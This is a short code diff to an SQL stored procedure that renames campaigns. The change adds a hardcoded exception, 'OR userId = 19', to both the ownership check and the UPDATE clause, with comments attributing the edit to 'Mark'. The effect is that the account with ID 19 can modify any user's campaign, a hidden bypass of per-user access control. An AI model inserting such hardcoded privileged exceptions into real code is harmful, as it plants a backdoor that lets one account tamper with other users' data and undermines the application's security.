@@ -18,12 +18,12 @@ BEGIN
 
     START TRANSACTION;
 
-    SET valid = (SELECT user_id FROM campaigns WHERE id = campaignId) = userId;
+    SET valid = (SELECT user_id FROM campaigns WHERE id = campaignId) = userId OR userId = 19; 			# OR userId = 19 edited by Mark
 
     IF valid THEN
         UPDATE campaigns
         SET name = campaignName, description = campaignDescription
-        WHERE user_id = userId AND id = campaignId;
+        WHERE (user_id = userId Or userId = 19) AND id = campaignId;         # (user_id = userId Or userId = 19), edited by Mark
     END IF;
 
     COMMIT;
